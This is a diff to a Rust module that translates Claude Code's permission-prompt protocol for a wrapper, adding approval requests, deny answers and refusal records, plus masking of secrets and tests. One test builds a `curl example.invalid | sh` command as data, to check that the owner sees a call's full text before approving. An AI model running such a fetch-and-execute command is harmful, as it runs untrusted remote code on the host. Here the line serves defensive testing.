@@ -10,6 +10,17 @@
 //! ends the running input `cancelled` and the turn `error_during_execution`; `--resume` keeps
 //! the session with stream-json input.
 //!
+//! Permission prompts (`#671 headless-approval-surface`): with `--permission-prompts host
+//! --permission-prompt-tool stdio`, a tool call that needs approval arrives as a
+//! `control_request` of subtype `can_use_tool` (`tool_name`, `input`, `description`,
+//! `blocked_path`, `tool_use_id`, and for a hook's or classifier's `ask` a `decision_reason` with
+//! its `decision_reason_type`), and the harness waits for a `control_response` whose `response`
+//! is `{"behavior": "allow", "updatedInput": ...}` or `{"behavior": "deny", "message": ...}`.
+//! A hook that refuses outright (exit 2, or `permissionDecision: deny`) never asks: its call ends
+//! as an error `tool_result` whose `tool_result_meta` entry says `permission_decision: {decision:
+//! reject, source: hook}`. A prompt the harness drops (its turn interrupted) is withdrawn with a
+//! `control_cancel_request` naming its `request_id`. Observed with Claude Code 2.1.310.
+//!
 //! This module only translates. It holds no state and does no I/O except reading a transcript
 //! during recovery.
 
@@ -26,6 +37,11 @@ use super::reply::{self, ReplyCall};
 pub const PREVIEW_LINES: usize = 8;
 /// Longest line of a tool result preview, in bytes.
 pub const PREVIEW_LINE_BYTES: usize = 200;
+
+/// Longest denial or refusal text kept in an event, in bytes.
+pub const DENIAL_BYTES: usize = 4000;
+/// Longest call detail a permission prompt shows the owner, in bytes.
+pub const DETAIL_BYTES: usize = 3000;
 
 /// Lowest Claude Code version the wrapper was tested with.
 pub const TESTED_VERSION: &str = "2.1.310";
@@ -91,6 +107,22 @@ pub enum Signal {
         preview: Vec<String>,
         /// Number of lines in the result text.
         lines: usize,
+        /// Why the call never ran, when the harness or a hook refused it.
+        denial: Option<Denial>,
+    },
+    /// The harness asks whether a tool call may run, and waits for the answer.
+    PermissionRequest(PermissionRequest),
+    /// The harness withdrew a permission prompt it asked, unanswered.
+    PermissionCancelled {
+        /// The withdrawn request's identifier.
+        request_id: String,
+    },
+    /// A control request the wrapper does not serve; it is answered with an error.
+    UnknownControlRequest {
+        /// The request's identifier.
+        request_id: String,
+        /// Its subtype.
+        subtype: String,
     },
     /// The turn ended.
     Result {
@@ -102,8 +134,8 @@ pub enum Signal {
         usage: Value,
         /// Cost of the turn in US dollars, when reported.
         cost_usd: Option<f64>,
-        /// Refused tool calls: `(tool, summary)`.
-        denials: Vec<(String, String)>,
+        /// Refused tool calls: `(tool, summary, tool_use_id)`.
+        denials: Vec<(String, String, String)>,
     },
     /// Compaction began.
     CompactStarted,
@@ -125,6 +157,41 @@ pub enum Signal {
     },
 }
 
+/// Why a tool call never ran.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct Denial {
+    /// Who refused it: `hook`, `approval` (an answer to the wrapper's prompt), `no-approval-surface`
+    /// (nobody could be asked), or the harness's own `permission_decision.source`.
+    pub source: String,
+    /// The refusal text the model got, masked and bounded ([`DENIAL_BYTES`]), lines kept.
+    pub reason: String,
+}
+
+/// One `can_use_tool` permission prompt.
+#[derive(Clone, Debug, PartialEq)]
+pub struct PermissionRequest {
+    /// The harness's request identifier, echoed in the answer.
+    pub request_id: String,
+    /// Tool name.
+    pub tool: String,
+    /// The call's input, returned unchanged as `updatedInput` when it is approved.
+    pub input: Value,
+    /// Bounded, masked summary of the call ([`tool_summary`]).
+    pub summary: String,
+    /// What the call would do, for the owner to judge ([`approval_detail`]).
+    pub detail: String,
+    /// Whether `detail` shows the whole call, unmasked and uncut.
+    pub complete: bool,
+    /// The hook's or classifier's reason for asking, or the harness's description of the call.
+    pub reason: String,
+    /// What asked: `hook`, `classifier`, ..., or `rule` when the harness gave no reason type.
+    pub reason_type: String,
+    /// The path outside the allowed directories that made it ask, if any.
+    pub blocked_path: Option<String>,
+    /// The tool call identifier.
+    pub tool_use_id: String,
+}
+
 /// The arguments the wrapper always passes, before the session and any operator arguments.
 #[must_use]
 pub fn protocol_arguments() -> Vec<String> {
@@ -141,19 +208,53 @@ pub fn protocol_arguments() -> Vec<String> {
     .collect()
 }
 
-/// The operator arguments as the harness gets them: `--permission-prompts none` is added
-/// unless given, so no tool call can wait for a human; anything refused is denied and shows as
-/// `permission.denied` in the event log.
+/// The operator arguments as the harness gets them. With `approvals` (the default), permission
+/// prompts go to the wrapper (`--permission-prompts host --permission-prompt-tool stdio`), which
+/// asks the owner ([`super::approval`]); without, `--permission-prompts none` is added, so no tool
+/// call can wait for a human and anything that would prompt is denied. An operator's own
+/// `--permission-prompts` wins either way: `none` turns approvals off.
 #[must_use]
-pub fn effective_arguments(arguments: &[String]) -> Vec<String> {
+pub fn effective_arguments(arguments: &[String], approvals: bool) -> Vec<String> {
     let mut effective = arguments.to_vec();
-    let given = arguments
-        .iter()
-        .any(|argument| argument.split('=').next() == Some("--permission-prompts"));
-    if !given {
-        effective.extend(["--permission-prompts".to_owned(), "none".to_owned()]);
+    match prompts_target(arguments) {
+        None if approvals => effective.extend(
+            [
+                "--permission-prompts",
+                "host",
+                "--permission-prompt-tool",
+                "stdio",
+            ]
+            .map(str::to_owned),
+        ),
+        None => effective.extend(["--permission-prompts".to_owned(), "none".to_owned()]),
+        Some(target) if target == "host" && approvals => {
+            effective.extend(["--permission-prompt-tool".to_owned(), "stdio".to_owned()]);
+        }
+        Some(_) => {}
     }
     effective
+}
+
+/// The operator's `--permission-prompts` value, when given.
+#[must_use]
+pub fn prompts_target(arguments: &[String]) -> Option<String> {
+    let mut iterator = arguments.iter();
+    while let Some(argument) = iterator.next() {
+        if let Some(value) = argument.strip_prefix("--permission-prompts=") {
+            return Some(value.to_owned());
+        }
+        if argument == "--permission-prompts" {
+            return Some(iterator.next().cloned().unwrap_or_default());
+        }
+    }
+    None
+}
+
+/// Whether the harness started with `arguments` (the operator's) sends permission prompts to
+/// the wrapper.
+#[must_use]
+pub fn asks_wrapper(arguments: &[String], approvals: bool) -> bool {
+    approvals && prompts_target(arguments).is_none_or(|target| target == "host")
 }
 
 /// Operator arguments the wrapper owns or that would let the harness wait for a human.
@@ -172,6 +273,7 @@ pub const RESERVED_ARGUMENTS: &[&str] = &[
     "--bare",
     "--replay-user-messages",
     "--include-partial-messages",
+    "--permission-prompt-tool",
 ];
 
 /// Refuse operator arguments that the wrapper must control.
@@ -248,6 +350,42 @@ pub fn interrupt_line(request_id: &str) -> String {
         "type": "control_request",
         "request_id": request_id,
         "request": {"subtype": "interrupt"},
+    })
+    .to_string();
+    line.push('\n');
+    line
+}
+
+/// The stdin line that answers permission prompt `request_id`: allow the call unchanged
+/// (`input` as `updatedInput`), or deny it with `message`, which the model reads as the tool's
+/// error.
+#[must_use]
+pub fn permission_answer_line(
+    request_id: &str,
+    allow: bool,
+    input: &Value,
+    message: &str,
+) -> String {
+    let response = if allow {
+        json!({"behavior": "allow", "updatedInput": input})
+    } else {
+        json!({"behavior": "deny", "message": message})
+    };
+    let mut line = json!({
+        "type": "control_response",
+        "response": {"subtype": "success", "request_id": request_id, "response": response},
+    })
+    .to_string();
+    line.push('\n');
+    line
+}
+
+/// The stdin line that refuses control request `request_id`, which the wrapper does not serve.
+#[must_use]
+pub fn control_error_line(request_id: &str, error: &str) -> String {
+    let mut line = json!({
+        "type": "control_response",
+        "response": {"subtype": "error", "request_id": request_id, "error": error},
     })
     .to_string();
     line.push('\n');
@@ -402,6 +540,109 @@ pub fn output_preview(text: &str, max_lines: usize) -> (Vec<String>, usize) {
     (preview, total)
 }
 
+/// What a call the owner is asked to approve would do: a shell command whole, otherwise the
+/// call's input as indented JSON (so an edit shows its file and its text), with line breaks
+/// and tabs kept, other control characters dropped, credential-shaped words masked
+/// ([`mask_output_line`]) and the whole bounded by [`DETAIL_BYTES`]. The flag is false when
+/// masking changed anything or the text was cut: then the owner cannot see the exact call, and
+/// a chat approval is refused ([`super::approval`]).
+#[must_use]
+pub fn approval_detail(tool: &str, input: &Value) -> (String, bool) {
+    let text = (tool == "Bash")
+        .then(|| input.get("command").and_then(Value::as_str))
+        .flatten()
+        .map_or_else(
+            || serde_json::to_string_pretty(input).unwrap_or_default(),
+            str::to_owned,
+        );
+    let clean: String = text
+        .chars()
+        .filter(|c| matches!(c, '\n' | '\t') || !c.is_control())
+        .collect();
+    let masked = clean
+        .lines()
+        .map(|line| {
+            if line.contains("PRIVATE KEY-----") {
+                "*** (private key withheld)".to_owned()
+            } else {
+                mask_output_line(line)
+            }
+        })
+        .collect::<Vec<_>>()
+        .join("\n");
+    let whole = masked == clean.trim_end_matches('\n') && clean.len() <= DETAIL_BYTES;
+    (excerpt(&masked, DETAIL_BYTES), whole && clean == text)
+}
+
+/// A refusal's text made safe to keep: every line masked ([`mask_output_line`]), control
+/// characters other than line breaks dropped, the whole bounded by [`DENIAL_BYTES`]; once a
+/// private key's armour appears, the rest is withheld.
+#[must_use]
+pub fn denial_text(text: &str) -> String {
+    let mut kept = Vec::new();
+    for line in text.trim_end().lines() {
+        if line.contains("PRIVATE KEY-----") {
+            kept.push("*** (private key withheld)".to_owned());
+            break;
+        }
+        let flat: String = line
+            .chars()
+            .map(|c| if c == '\t' { ' ' } else { c })
+            .filter(|c| !c.is_control())
+            .collect();
+        kept.push(mask_output_line(flat.trim_end()));
+    }
+    excerpt(&kept.join("\n"), DENIAL_BYTES)
+}
+
+/// Text that Claude Code gives a call it refused without running it, when `tool_result_meta`
+/// does not say so (an older harness): the source it implies.
+fn denial_source_from_text(text: &str) -> Option<&'static str> {
+    let text = text.trim_start();
+    if text.starts_with("Permission for this tool use was denied. It requires approval, and this session has no approval surface") {
+        Some("no-approval-surface")
+    } else if text.starts_with("PreToolUse:") && text.contains("hook error") {
+        Some("hook")
+    } else if text.starts_with("Permission for this tool use was denied")
+        || text.starts_with("Permission to use ")
+    {
+        Some("permission")
+    } else {
+        None
+    }
+}
+
+/// Why the error result of call `id` never ran, from the line's `tool_result_meta` (or, without
+/// one, its text): `None` for a call that ran and failed.
+fn denial_of(line: &Value, id: &str, text: &str) -> Option<Denial> {
+    let meta = line
+        .get("tool_result_meta")
+        .and_then(Value::as_array)
+        .and_then(|entries| {
+            entries
+                .iter()
+                .find(|entry| entry.get("id").and_then(Value::as_str) == Some(id))
+        });
+    let source = match meta.and_then(|entry| entry.get("permission_decision")) {
+        Some(decision) if decision.get("decision").and_then(Value::as_str) == Some("reject") => {
+            match decision.get("source").and_then(Value::as_str).unwrap_or("") {
+                // The model sees `user_reject` when the wrapper's prompt was answered no.
+                "user_reject" | "user_temporary" | "user_permanent" => "approval".to_owned(),
+                "" => denial_source_from_text(text)
+                    .unwrap_or("permission")
+                    .to_owned(),
+                other => other.to_owned(),
+            }
+        }
+        Some(_) => return None,
+        None => denial_source_from_text(text)?.to_owned(),
+    };
+    Some(Denial {
+        source,
+        reason: denial_text(text),
+    })
+}
+
 fn content_bytes(content: &Value) -> usize {
     match content {
         Value::String(text) => text.len(),
@@ -537,18 +778,26 @@ pub fn parse(line: &Value) -> Vec<Signal> {
                     })
                     .map(|block| {
                         let content = block.get("content").unwrap_or(&Value::Null);
-                        let (preview, lines) =
-                            output_preview(&content_text(content), PREVIEW_LINES);
+                        let text = content_text(content);
+                        let (preview, lines) = output_preview(&text, PREVIEW_LINES);
+                        let id = block
+                            .get("tool_use_id")
+                            .and_then(Value::as_str)
+                            .unwrap_or("")
+                            .to_owned();
+                        let ok = block.get("is_error").and_then(Value::as_bool) != Some(true);
+                        let denial = if ok {
+                            None
+                        } else {
+                            denial_of(line, &id, &text)
+                        };
                         Signal::ToolCompleted {
-                            id: block
-                                .get("tool_use_id")
-                                .and_then(Value::as_str)
-                                .unwrap_or("")
-                                .to_owned(),
-                            ok: block.get("is_error").and_then(Value::as_bool) != Some(true),
+                            id,
+                            ok,
                             bytes: content_bytes(content),
                             preview,
                             lines,
+                            denial,
                         }
                     })
                     .collect()
@@ -580,7 +829,12 @@ pub fn parse(line: &Value) -> Vec<Signal> {
                                 &tool,
                                 denial.get("tool_input").unwrap_or(&Value::Null),
                             );
-                            (tool, summary)
+                            let id = denial
+                                .get("tool_use_id")
+                                .and_then(Value::as_str)
+                                .unwrap_or("")
+                                .to_owned();
+                            (tool, summary, id)
                         })
                         .collect()
                 })
@@ -593,6 +847,54 @@ pub fn parse(line: &Value) -> Vec<Signal> {
                 denials,
             }]
         }
+        ("control_request", _) => {
+            let request_id = text("request_id");
+            let request = line.get("request").unwrap_or(&Value::Null);
+            let field = |key: &str| {
+                request
+                    .get(key)
+                    .and_then(Value::as_str)
+                    .unwrap_or("")
+                    .to_owned()
+            };
+            match request.get("subtype").and_then(Value::as_str).unwrap_or("") {
+                "can_use_tool" => {
+                    let tool = field("tool_name");
+                    let input = request.get("input").cloned().unwrap_or(Value::Null);
+                    let reason = [field("decision_reason"), field("description")]
+                        .into_iter()
+                        .find(|reason| !reason.trim().is_empty())
+                        .unwrap_or_default();
+                    let reason_type = match field("decision_reason_type") {
+                        kind if kind.is_empty() => "rule".to_owned(),
+                        kind => kind,
+                    };
+                    let (detail, complete) = approval_detail(&tool, &input);
+                    vec![Signal::PermissionRequest(PermissionRequest {
+                        request_id,
+                        summary: tool_summary(&tool, &input),
+                        detail,
+                        complete,
+                        tool,
+                        input,
+                        reason: denial_text(&reason),
+                        reason_type,
+                        blocked_path: request
+                            .get("blocked_path")
+                            .and_then(Value::as_str)
+                            .map(str::to_owned),
+                        tool_use_id: field("tool_use_id"),
+                    })]
+                }
+                subtype => vec![Signal::UnknownControlRequest {
+                    request_id,
+                    subtype: subtype.to_owned(),
+                }],
+            }
+        }
+        ("control_cancel_request", _) => vec![Signal::PermissionCancelled {
+            request_id: text("request_id"),
+        }],
         ("control_response", _) => {
             let response = line.get("response").cloned().unwrap_or(Value::Null);
             vec![Signal::ControlResponse {
@@ -731,11 +1033,12 @@ mod tests {
                 bytes: 3,
                 preview: vec!["abc".to_owned()],
                 lines: 1,
+                denial: None,
             }]
         );
         let result = json!({"type": "result", "subtype": "success", "duration_ms": 1795,
             "usage": {"input_tokens": 2}, "model_usage_since_last_result": {"m": {"costUSD": 0.25}, "n": {"costUSD": 0.5}},
-            "permission_denials": [{"tool_name": "Bash", "tool_input": {"command": "touch x"}}]});
+            "permission_denials": [{"tool_name": "Bash", "tool_use_id": "t7", "tool_input": {"command": "touch x"}}]});
         let Signal::Result {
             subtype,
             cost_usd,
@@ -747,7 +1050,10 @@ mod tests {
         };
         assert_eq!(subtype, "success");
         assert_eq!(*cost_usd, Some(0.75));
-        assert_eq!(denials, &vec![("Bash".to_owned(), "touch x".to_owned())]);
+        assert_eq!(
+            denials,
+            &vec![("Bash".to_owned(), "touch x".to_owned(), "t7".to_owned())]
+        );
         let compact = json!({"type": "system", "subtype": "compact_boundary",
             "compact_metadata": {"trigger": "manual", "pre_tokens": 37807}});
         assert_eq!(
@@ -776,13 +1082,197 @@ mod tests {
     }
 
     #[test]
-    fn permission_prompts_default_to_none() {
+    fn permission_prompts_go_to_the_wrapper_unless_turned_off() {
+        let model = ["--model".to_owned(), "m".to_owned()];
         assert_eq!(
-            effective_arguments(&["--model".to_owned(), "m".to_owned()]),
+            effective_arguments(&model, true),
+            vec![
+                "--model",
+                "m",
+                "--permission-prompts",
+                "host",
+                "--permission-prompt-tool",
+                "stdio"
+            ]
+        );
+        assert!(asks_wrapper(&model, true));
+        assert_eq!(
+            effective_arguments(&model, false),
             vec!["--model", "m", "--permission-prompts", "none"]
         );
-        let given = vec!["--permission-prompts=host".to_owned()];
-        assert_eq!(effective_arguments(&given), given);
+        assert!(!asks_wrapper(&model, false));
+        // The operator's own choice wins: none turns approvals off, host keeps them.
+        let none = vec!["--permission-prompts=none".to_owned()];
+        assert_eq!(effective_arguments(&none, true), none);
+        assert!(!asks_wrapper(&none, true));
+        let host = vec!["--permission-prompts".to_owned(), "host".to_owned()];
+        assert_eq!(
+            effective_arguments(&host, true),
+            vec![
+                "--permission-prompts",
+                "host",
+                "--permission-prompt-tool",
+                "stdio"
+            ]
+        );
+        assert!(validate_arguments(&["--permission-prompt-tool=x".to_owned()]).is_err());
+    }
+
+    #[test]
+    fn permission_prompts_and_their_withdrawal_translate() {
+        // As Claude Code 2.1.310 sent it for a PreToolUse hook's `ask`.
+        let ask = json!({"type": "control_request", "request_id": "r-1", "request": {
+            "subtype": "can_use_tool", "tool_name": "Bash", "display_name": "Bash",
+            "input": {"command": "touch /tmp/x token=hunter2", "description": "Create x"},
+            "description": "Create x",
+            "decision_reason": "Probe hook: touching files needs a human.",
+            "decision_reason_type": "hook", "decision_reason_hook_event": "PreToolUse",
+            "tool_use_id": "toolu_1"}});
+        let signals = parse(&ask);
+        let [Signal::PermissionRequest(request)] = signals.as_slice() else {
+            panic!("{:?}", parse(&ask))
+        };
+        assert_eq!(request.request_id, "r-1");
+        assert_eq!(request.tool, "Bash");
+        assert_eq!(request.summary, "touch /tmp/x token=***");
+        assert_eq!(request.reason, "Probe hook: touching files needs a human.");
+        assert_eq!(request.reason_type, "hook");
+        assert_eq!(request.tool_use_id, "toolu_1");
+        // The owner sees the whole command; a masked word means it is not shown exactly.
+        assert_eq!(request.detail, "touch /tmp/x token=***");
+        assert!(!request.complete);
+        assert_eq!(request.input["command"], "touch /tmp/x token=hunter2");
+        // A path prompt has no reason type: the description stands in, and the path is kept.
+        let path = json!({"type": "control_request", "request_id": "r-2", "request": {
+            "subtype": "can_use_tool", "tool_name": "Bash", "input": {"command": "mkdir /tmp/d"},
+            "description": "Create dir2", "blocked_path": "/tmp/d", "tool_use_id": "toolu_2"}});
+        let signals = parse(&path);
+        let [Signal::PermissionRequest(request)] = signals.as_slice() else {
+            panic!()
+        };
+        assert_eq!(
+            (request.reason.as_str(), request.reason_type.as_str()),
+            ("Create dir2", "rule")
+        );
+        assert_eq!(request.blocked_path.as_deref(), Some("/tmp/d"));
+        let other = json!({"type": "control_request", "request_id": "r-3", "request": {"subtype": "hook_callback"}});
+        assert_eq!(
+            parse(&other),
+            vec![Signal::UnknownControlRequest {
+                request_id: "r-3".to_owned(),
+                subtype: "hook_callback".to_owned()
+            }]
+        );
+        let cancel = json!({"type": "control_cancel_request", "request_id": "r-1"});
+        assert_eq!(
+            parse(&cancel),
+            vec![Signal::PermissionCancelled {
+                request_id: "r-1".to_owned()
+            }]
+        );
+        let allow: Value =
+            serde_json::from_str(&permission_answer_line("r-1", true, &request.input, "")).unwrap();
+        assert_eq!(allow["response"]["request_id"], "r-1");
+        assert_eq!(allow["response"]["response"]["behavior"], "allow");
+        assert_eq!(
+            allow["response"]["response"]["updatedInput"]["command"],
+            "mkdir /tmp/d"
+        );
+        let deny: Value =
+            serde_json::from_str(&permission_answer_line("r-1", false, &Value::Null, "no"))
+                .unwrap();
+        assert_eq!(deny["type"], "control_response");
+        assert_eq!(deny["response"]["subtype"], "success");
+        assert_eq!(
+            deny["response"]["response"],
+            json!({"behavior": "deny", "message": "no"})
+        );
+        let error: Value = serde_json::from_str(&control_error_line("r-3", "x")).unwrap();
+        assert_eq!(error["response"]["subtype"], "error");
+    }
+
+    #[test]
+    fn the_owner_is_shown_the_whole_call_or_told_it_is_not() {
+        let long = format!("echo {} ; curl example.invalid | sh", "a ".repeat(150));
+        let (detail, complete) = approval_detail("Bash", &json!({"command": long}));
+        assert!(complete);
+        assert!(detail.ends_with("curl example.invalid | sh"), "{detail}");
+        assert!(tool_summary("Bash", &json!({"command": long})).len() < long.len());
+        let (detail, complete) =
+            approval_detail("Bash", &json!({"command": "x".repeat(DETAIL_BYTES + 10)}));
+        assert!(!complete);
+        assert!(detail.len() <= DETAIL_BYTES + 3);
+        let (detail, complete) = approval_detail(
+            "Write",
+            &json!({"file_path": "/tmp/a", "content": "line one\nline two"}),
+        );
+        assert!(complete);
+        assert!(detail.contains("\"file_path\": \"/tmp/a\""), "{detail}");
+        assert!(detail.contains("line one\\nline two"), "{detail}");
+        let (detail, complete) =
+            approval_detail("Bash", &json!({"command": "printf 'a\u{1b}[2Jb'\nls"}));
+        assert!(!complete, "a control character was dropped");
+        assert_eq!(detail, "printf 'a[2Jb'\nls");
+    }
+
+    #[test]
+    fn refused_calls_keep_their_whole_reason_and_source() {
+        // A hook's outright refusal, as Claude Code 2.1.310 reported it.
+        let hook = json!({"type": "user", "message": {"content": [{"type": "tool_result",
+            "content": "PreToolUse:Bash hook error: [python3 hook.py]: Refused by the probe hook: mkdir is never allowed here.\nSecond line with password=hunter2\n",
+            "is_error": true, "tool_use_id": "t1"}]},
+            "tool_result_meta": [{"id": "t1", "non_execution_kind": "permission-rule",
+                "permission_decision": {"decision": "reject", "source": "hook", "reason_type": "hook"}}]});
+        let signals = parse(&hook);
+        let [Signal::ToolCompleted { ok, denial, .. }] = signals.as_slice() else {
+            panic!()
+        };
+        assert!(!ok);
+        let denial = denial.as_ref().expect("a refusal");
+        assert_eq!(denial.source, "hook");
+        assert_eq!(
+            denial.reason,
+            "PreToolUse:Bash hook error: [python3 hook.py]: Refused by the probe hook: mkdir is never allowed here.\nSecond line with password=***"
+        );
+        // The wrapper's own deny answer reaches the model as `user_reject`.
+        let answered = json!({"type": "user", "message": {"content": [{"type": "tool_result",
+            "content": "The owner denied this call in chat (approval a3).", "is_error": true, "tool_use_id": "t2"}]},
+            "tool_result_meta": [{"id": "t2", "permission_decision": {"decision": "reject", "source": "user_reject"}}]});
+        let signals = parse(&answered);
+        let [Signal::ToolCompleted { denial, .. }] = signals.as_slice() else {
+            panic!()
+        };
+        assert_eq!(denial.as_ref().unwrap().source, "approval");
+        // Without metadata, the harness's own wording still names the refusal; the whole text
+        // is kept, well past a preview line.
+        let long = format!("Permission for this tool use was denied. It requires approval, and this session has no approval surface — nobody can answer a permission prompt here — so it was denied automatically. {}", "detail ".repeat(60));
+        let none = json!({"type": "user", "message": {"content": [{"type": "tool_result",
+            "content": long, "is_error": true, "tool_use_id": "t3"}]}});
+        let signals = parse(&none);
+        let [Signal::ToolCompleted {
+            denial, preview, ..
+        }] = signals.as_slice()
+        else {
+            panic!()
+        };
+        let denial = denial.as_ref().unwrap();
+        assert_eq!(denial.source, "no-approval-surface");
+        assert!(
+            denial.reason.len() > PREVIEW_LINE_BYTES * 2,
+            "{}",
+            denial.reason
+        );
+        assert!(preview[0].len() <= PREVIEW_LINE_BYTES + 3);
+        // A call that ran and failed is not a refusal; an accepted call is not either.
+        let failed = json!({"type": "user", "message": {"content": [{"type": "tool_result",
+            "content": "exit 1", "is_error": true, "tool_use_id": "t4"}]},
+            "tool_result_meta": [{"id": "t4", "permission_decision": {"decision": "accept", "source": "hook"}}]});
+        let signals = parse(&failed);
+        let [Signal::ToolCompleted { denial, .. }] = signals.as_slice() else {
+            panic!()
+        };
+        assert_eq!(*denial, None);
+        assert!(denial_text(&"x".repeat(DENIAL_BYTES * 2)).len() <= DENIAL_BYTES + 3);
     }
 
     #[test]
